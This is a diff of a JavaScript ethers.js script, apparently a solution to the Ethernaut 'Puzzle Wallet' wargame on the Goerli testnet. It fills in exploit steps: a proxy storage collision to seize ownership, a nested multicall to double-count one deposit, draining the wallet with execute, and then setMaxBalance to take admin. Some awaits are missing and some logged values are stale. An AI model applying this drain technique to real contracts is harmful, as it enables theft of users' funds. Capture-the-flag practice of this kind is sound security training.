@@ -19,11 +19,15 @@ const attackPuzzleWallet = async () => {
     //  2   |           .
     //  3   |           .
 
+    // 1. Make player the owner
+    // check owner
+    const contractPuzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);
+    const owner = (await contractPuzzleWallet.owner()).toString();
+    console.log(`Initial owner is ${owner}`);
     const provider = await ethers.getDefaultProvider("goerli");
     /*Private Keys in .env file or hardcode here*/
     const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
     const wallet = new Wallet(PRIVATE_KEY, provider);
-
     const params = playerAddress;
     const funcSign = ["function proposeNewAdmin(address _newAdmin) external"];
     const iface = new ethers.utils.Interface(funcSign);
@@ -35,15 +39,17 @@ const attackPuzzleWallet = async () => {
     });
     const txReceipt1 = await tx1.wait(1);
     console.log(txReceipt1);
-    // check below that player is now owner
-    // TODO:
-
-    const contractPuzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);
+    console.log(`Now owner is ${owner}...should be ${playerAddress}`);
+    // 2. player adds himself to whitelist so that player can call onlyWhitelisted() guarded methods.
     const tx2 = await contractPuzzleWallet.addToWhitelist(playerAddress);
+    const txReceipt2 = tx2.wait();
+    // 3. alter maxBalance to add admin via setMaxbalance()
     // get balance of puzzle contract
     const puzzleWalletBalance = await provider.getBalance(puzzleWalletAddress);
     console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance}`);
-    // TODO: fill in function call signature
+    // setMaxBalance can only set new maxBalance only if the contract's balance is 0.
+    // crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.
+    // can be done via multicall below
     const depositData = contractPuzzleWallet.interface.encodeFunctionData("deposit");
     const multicallData = contractPuzzleWallet.interface.encodeFunctionData("multicall", [
         [depositData],
@@ -51,6 +57,7 @@ const attackPuzzleWallet = async () => {
     const tx3 = await contractPuzzleWallet.multicall([multicallData, multicallData], {
         value: ethers.utils.parseEther("0.001"),
     });
+    const txReceipt3 = tx3.wait();
     // check balance after here
     // execute to drain
     const tx4 = await contractPuzzleWallet.execute(
@@ -58,10 +65,12 @@ const attackPuzzleWallet = async () => {
         ethers.utils.parseEther("0.002"),
         "0x"
     );
+    const txReceipt4 = tx4.wait();
     // puzzlew wallet balance should be 0
     console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance} (Should be 0 here)`);
     //set maxbalance to change owner to player
     const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
+    const txReceipt5 = tx5.wait();
 };
 
 attackPuzzleWallet()
